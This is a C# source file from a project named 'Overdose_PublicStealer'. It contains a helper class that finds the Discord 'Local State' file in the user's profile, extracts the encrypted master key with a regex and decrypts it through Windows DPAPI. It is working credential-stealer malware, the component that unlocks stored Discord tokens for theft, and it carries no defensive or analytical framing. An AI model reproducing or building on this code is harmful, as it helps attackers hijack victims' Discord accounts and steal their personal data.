using System; // Used for Environment, Exception, Console, etc.
using System.IO; // Used for Path, File, Directory operations
using System.Linq; // Used for LINQ methods like .Skip(), .ToArray()
using System.Text.RegularExpressions;
using OdPS.Utils; // Used for finding patterns in the JSON file

namespace Overdose_PublicStealer
{
    // This static class is responsible for retrieving the Discord master encryption key.
    // The master key is stored in a local configuration file and encrypted using Windows DPAPI.
    internal static class MasterKeyHelper
    {
        private const string LocalStateFileName = "Local State";
        private const string DiscordAppDataPath = "discord";
        private const string EncryptedKeyPattern = @"""encrypted_key"":\s*""(.*?)""";
        private const int EncryptedKeyPrefixLength = 5;

        /// <summary>
        /// Locates the Discord 'Local State' file, extracts the DPAPI-encrypted master key,
        /// and decrypts it using the Windows DPAPI.
        /// </summary>
        /// <returns>The decrypted master key as a byte array if successful, otherwise null.</returns>
        internal static byte[] GetMasterKey()
        {
            // Construct the typical path to the Discord 'Local State' file.
            string path = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                "AppData", "Roaming", DiscordAppDataPath, LocalStateFileName);

            // Check if the 'Local State' file exists at the expected path.
            if (!File.Exists(path))
            {
                return null; // Return null if the file is not found.
            }

            // Use a try-catch block to handle potential errors during file reading or processing.
            try
            {
                // Read the entire content of the 'Local State' file as a string.
                string json = File.ReadAllText(path);

                // Use a regular expression to find the value associated with the key "encrypted_key".
                var keyB64 = Regex.Match(json, EncryptedKeyPattern).Groups[1].Value;

                // Check if the "encrypted_key" was found and the extracted Base64 string is not empty.
                if (string.IsNullOrEmpty(keyB64))
                {
                    return null; // Return null if the encrypted key value is missing from the JSON.
                }

                // Convert the Base64 encoded string back into a byte array.
                byte[] encryptedKey = Convert.FromBase64String(keyB64);

                // Skip the first 5 bytes to get the DPAPI-encrypted data payload.
                byte[] keyNoPrefix = encryptedKey.Skip(EncryptedKeyPrefixLength).ToArray();

                // Use the DPAPI helper class to decrypt the byte array using the Windows DPAPI.
                return DPAPI.Decrypt(keyNoPrefix);
            }
            catch (Exception ex)
            {
                // Log the error message.
                Console.WriteLine($"Error getting master key: {ex.Message}");
                return null; // Return null to indicate that the master key could not be retrieved.
            }
        }
    }
}
